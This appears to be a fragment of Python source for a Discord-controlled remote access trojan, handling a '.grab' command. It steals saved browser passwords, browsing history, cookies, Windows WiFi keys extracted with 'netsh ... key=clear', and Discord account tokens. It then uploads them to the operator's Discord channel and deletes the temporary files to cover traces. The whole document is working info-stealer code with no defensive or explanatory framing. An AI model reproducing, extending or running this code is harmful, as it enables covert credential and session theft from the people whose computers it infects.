from resources.discord_token_grabber import *
from resources.passwords_grabber import *
from browser_history import get_history
from resources.get_cookies import *
from urllib.request import urlopen
from threading import Thread
from resources.misc import *
import subprocess
import os
# end of imports

# on message
elif message.content[:5] == '.grab':
    await message.delete()
    if message.content.strip() == '.grab':
        reaction_msg = await message.channel.send('```Syntax: .grab <what-to-grab>```'); await reaction_msg.add_reaction('🔴')    
    else:
        if message.content[6:] == 'passwords':
            result = grab_passwords()
            embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
            for url in result.keys():
                embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
            
        elif message.content[6:] == 'history':
            with open('history.txt', 'w') as history:
                for entry in get_history().histories:
                    history.write(entry[0].strftime('%d.%m.%Y %H:%M') + ' -> ' + entry[1] +'\n\n')
            reaction_msg = await message.channel.send(file=discord.File('history.txt')); await reaction_msg.add_reaction('🔴')
            subprocess.run('del history.txt', shell=True)
        
        elif message.content[6:] == 'cookies':
            await message.channel.send('```Grabbing cookies. Please wait...```')
            grab_cookies()
            await asyncio.sleep(1)
            reaction_msg = await client.get_channel(channel_ids['main']).send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
            subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
            
        elif message.content[6:].lower() == 'wifi':
            networks = force_decode(subprocess.run('netsh wlan show profile', capture_output=True, shell=True).stdout).strip()
            polish_bytes = ['\\xa5', '\\x86', '\\xa9', '\\x88', '\\xe4', '\\xa2', '\\x98', '\\xab', '\\xbe', '\\xa4', '\\x8f', '\\xa8', '\\x9d', '\\xe3', '\\xe0', '\\x97', '\\x8d', '\\xbd']
            polish_chars = ['ą', 'ć', 'ę', 'ł', 'ń', 'ó', 'ś', 'ź', 'ż', 'Ą', 'Ć', 'Ę', 'Ł', 'Ń', 'Ó', 'Ś', 'Ź', 'Ż']

            for i in polish_bytes:
                networks = networks.replace(i, polish_chars[polish_bytes.index(i)])

            network_names_list = []
            for profile in networks.split('\n'):
                if ': ' in profile:
                    network_names_list.append(profile[profile.find(':')+2:].replace('\r', ''))

            result, password = {}, ''
            for network_name in network_names_list:
                command = 'netsh wlan show profile "' + network_name + '" key=clear'
                current_result = force_decode(subprocess.run(command, capture_output=True, shell=True).stdout).strip()
                for i in polish_bytes:
                    current_result = current_result.replace(i, polish_chars[polish_bytes.index(i)])
                for line in current_result.split('\n'):
                    if 'Key Content' in line:
                        password = line[line.find(':')+2:-1]
                result[network_name] = password
            
            embed=discord.Embed(title='Grabbed WiFi passwords', color=0x0084ff)
            for network in result.keys():
                embed.add_field(name='🪪 ' + network, value='🔑 ' + result[network], inline=False)
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')

        elif message.content[6:] == 'discord':
            accounts = grab_discord.initialize()
            for account in accounts:
                reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
